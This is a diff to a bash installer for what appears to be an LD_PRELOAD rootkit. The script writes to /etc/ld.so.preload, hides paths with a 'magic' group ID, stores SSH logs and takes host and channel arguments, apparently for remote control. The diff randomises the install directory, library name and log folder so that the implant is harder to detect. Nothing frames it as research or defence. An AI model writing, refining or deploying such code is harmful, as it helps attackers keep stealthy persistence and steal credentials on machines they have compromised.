@@ -16,23 +16,25 @@ PRELOAD="/etc/ld.so.preload"
 HOST="$1"
 CHANNEL="$2"
 
-random_soname(){ # $1 = desired length of name
+random_name(){ # $1 = desired length of name
     local names name name_length
-    names=(`cat src/sonames.txt`)
+    names=(`cat src/names.txt`)
     name_length=$1
 
     name=${names[$RANDOM % ${#names[@]}]}
     while [ ${#name} -gt $name_length ]; do name=${name::${#name}-1}; done
-    while [ ${#name} -lt $name_length ]; do name+="a"; done
+    while [ ${#name} -lt $name_length ]; do name+="`cat /dev/urandom | tr -dc 'a-z' | fold -w 1 | head -n 1`"; done
 
     echo -n "$name"
 }
 
-[ -z $NICK ] && NICK="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1)"
-[ -z $MAGIC_GID ] && MAGIC_GID=$(cat /dev/urandom | tr -dc '1-9' | fold -w 5 | head -n 1)
-[ -z $INSTALL_DIR ] && INSTALL_DIR="/lib/$NICK.$MAGIC_GID"
-[ -z $SSH_LOGS ] && SSH_LOGS="$INSTALL_DIR/sshlogs"
-[ -z $SONAME ] && SONAME="lib`random_soname 6`.so"
+[ -z $NICK ] && NICK="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
+[ -z $MAGIC_GID ] && MAGIC_GID=`cat /dev/urandom | tr -dc '1-9' | fold -w 5 | head -n 1`
+
+RANDOM_NAME="`random_name 7`"
+[ -z $INSTALL_DIR ] && INSTALL_DIR="/lib/$RANDOM_NAME"
+[ -z $SSH_LOGS ] && SSH_LOGS="$INSTALL_DIR/`random_name 5`"
+[ -z $SONAME ] && SONAME="lib$RANDOM_NAME.so"
 [ -z $SOPATH ] && SOPATH="$INSTALL_DIR/$SONAME"
 
 hidepath(){ chown -h 0:$MAGIC_GID $1; }
